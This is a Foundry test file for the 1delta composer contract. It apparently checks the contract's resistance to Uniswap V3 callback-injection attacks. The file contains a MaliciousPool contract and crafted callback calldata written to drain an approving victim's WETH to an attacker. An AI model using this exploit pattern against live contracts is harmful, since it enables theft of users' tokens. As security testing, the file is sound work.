// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {BaseTest} from "../shared/BaseTest.sol";
import {console} from "forge-std/console.sol";
import {OneDeltaComposerLight} from "../../../contracts/1delta/modules/light/Composer.sol";
import {Chains, Tokens, Lenders} from "../data/LenderRegistry.sol";
import {DexTypeMappings} from "../../../contracts/1delta/modules/light/swappers/dex/DexTypeMappings.sol";
import {CalldataLib} from "./utils/CalldataLib.sol";

contract CallDataInjection is BaseTest {
    using CalldataLib for bytes;
    uint256 internal constant forkBlock = 28493852;

    address internal constant UNI_FACTORY = 0x33128a8fC17869897dcE68Ed026d694621f6FDfD;

    OneDeltaComposerLight composer;

    address internal WETH;
    address internal USDC;

    address internal WETH_USDC_500_POOL;
    address internal attacker;

    function setUp() public virtual {
        _init(Chains.BASE, forkBlock);

        WETH = chain.getTokenAddress(Tokens.WETH);
        USDC = chain.getTokenAddress(Tokens.USDC);

        composer = new OneDeltaComposerLight();

        WETH_USDC_500_POOL = IF(UNI_FACTORY).getPool(WETH, USDC, 500);

        // create attacker and deal some tokens to attacker
        attacker = makeAddr("attacker");
        vm.deal(address(attacker), 1 ether);
        deal(WETH, address(attacker), 1 ether);
    }

    function test_light_callback_injection_bad_pool() public {
        MaliciousPool maliciousPool = new MaliciousPool(
            address(user),
            address(attacker),
            WETH // token to steal
        );

        deal(WETH, address(user), 10 ether);
        deal(WETH, address(attacker), 10);

        vm.prank(attacker);
        IERC20(WETH).approve(address(composer), 10);

        // Victim approves composer, or approved composer in another tx
        vm.startPrank(user);
        IERC20(WETH).approve(address(composer), type(uint256).max);
        vm.stopPrank();

        uint256 victimInitialBalance = IERC20(WETH).balanceOf(address(user));
        uint256 attackerInitialBalance = IERC20(WETH).balanceOf(address(attacker));

        console.log("Victim initial WETH balance:", victimInitialBalance / 1e18, "WETH");
        console.log("Attacker initial WETH balance:", attackerInitialBalance / 1e18, "WETH");

        bytes memory swapCall = CalldataLib.swapHead(10, 0, WETH, false).attachBranch(0, 0, new bytes(0)).uniswapV3StyleSwap(
            USDC,
            address(attacker),
            0,
            address(maliciousPool),
            500,
            CalldataLib.DexPayConfig.CALLER_PAYS,
            new bytes(0)
        );

        // Execute swap through the composer contract
        vm.startPrank(attacker);
        try composer.deltaCompose(swapCall) {
            console.log("Swap completed");
        } catch Error(string memory reason) {
            console.log("Swap reverted with reason:", reason);
        } catch {
            console.log("Swap reverted without reason");
        }
        vm.stopPrank();

        // Check final balances
        uint256 victimFinalBalance = IERC20(WETH).balanceOf(address(user));
        uint256 attackerFinalBalance = IERC20(WETH).balanceOf(address(attacker));

        console.log("Victim final WETH balance:", victimFinalBalance / 1e18, "WETH");
        console.log("Attacker final WETH balance:", attackerFinalBalance / 1e18, "WETH");

        // Verify if the attack was successful
        if (attackerFinalBalance > attackerInitialBalance) {
            console.log("ATTACK SUCCESSFUL: Attacker stole", (attackerFinalBalance - attackerInitialBalance) / 1e18, "WETH");
        } else {
            console.log("Attack failed - no tokens were stolen");
        }
    }

    function test_light_callback_injection_direct_inject() public {
        bytes4 uniV3CallbackSelector = bytes4(0xfa461e33);
        // deal weth to user and approve composer, simulating a prior tx on composer by the victim
        deal(WETH, address(user), 10 ether);
        vm.prank(user);
        IERC20(WETH).approve(address(composer), type(uint256).max);

        // Record initial balances
        uint256 userInitialBalance = IERC20(WETH).balanceOf(address(user));
        uint256 attackerInitialBalance = IERC20(WETH).balanceOf(address(attacker));

        console.log("Victim initial WETH balance:", userInitialBalance / 1e18, "WETH");
        console.log("Attacker initial WETH balance:", attackerInitialBalance / 1e18, "WETH");

        bytes memory transferCall = CalldataLib.transferIn(WETH, attacker, userInitialBalance);
        bytes memory maliciousCall = abi.encodePacked(
            user,
            WETH,
            address(0),
            uint8(DexTypeMappings.UNISWAP_V3_ID),
            uint16(500),
            uint16(transferCall.length),
            transferCall
        );

        // try to execute the attack
        vm.startPrank(attacker);
        address(composer).call(abi.encodeWithSelector(uniV3CallbackSelector, 1, 0, maliciousCall));
        vm.stopPrank();

        // Check final balances
        uint256 userFinalBalance = IERC20(WETH).balanceOf(address(user));
        uint256 attackerFinalBalance = IERC20(WETH).balanceOf(address(attacker));

        console.log("Victim final WETH balance:", userFinalBalance / 1e18, "WETH");
        console.log("Attacker final WETH balance:", attackerFinalBalance / 1e18, "WETH");

        // Verify if the attack was successful
        if (attackerFinalBalance > attackerInitialBalance) {
            console.log("ATTACK SUCCESSFUL: Attacker stole", (attackerFinalBalance - attackerInitialBalance) / 1e18, "WETH");
        } else {
            console.log("Attack failed - no tokens were stolen");
        }
    }
}

// Helper contracts and interfaces
// -------------------------------------------------------------------------------------------------
interface IF {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IUniPool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

contract MaliciousPool {
    bytes32 private constant SELECTOR_UNIV3 = 0xfa461e3300000000000000000000000000000000000000000000000000000000;

    address public victim;
    address public attacker;
    address public tokenToSteal;

    constructor(address _victim, address _attacker, address _tokenToSteal) {
        victim = _victim;
        attacker = _attacker;
        tokenToSteal = _tokenToSteal;
    }

    // Function to mimic the Uniswap V3 pool's swap function
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1) {
        uint256 victimBalance = IERC20(tokenToSteal).balanceOf(victim);
        require(victimBalance > 0, "Victim has no balance");

        bytes memory transferCall = CalldataLib.transferIn(tokenToSteal, attacker, victimBalance);

        // callback data
        bytes memory callbackData = abi.encodePacked(
            victim, // Replace victim address as caller
            tokenToSteal, // Token to steal
            address(0), // Any tokenOut
            uint8(DexTypeMappings.UNISWAP_V3_ID), // dexId
            uint16(500), // fee
            uint16(transferCall.length),
            transferCall
        );

        // Call the callback function on the composer
        (bool success, ) = msg.sender.call(
            abi.encodeWithSelector(
                bytes4(SELECTOR_UNIV3),
                int256(1), // amount0Delta
                int256(0), // amount1Delta
                callbackData
            )
        );

        require(success, "Callback failed");

        return (1, 0);
    }
}
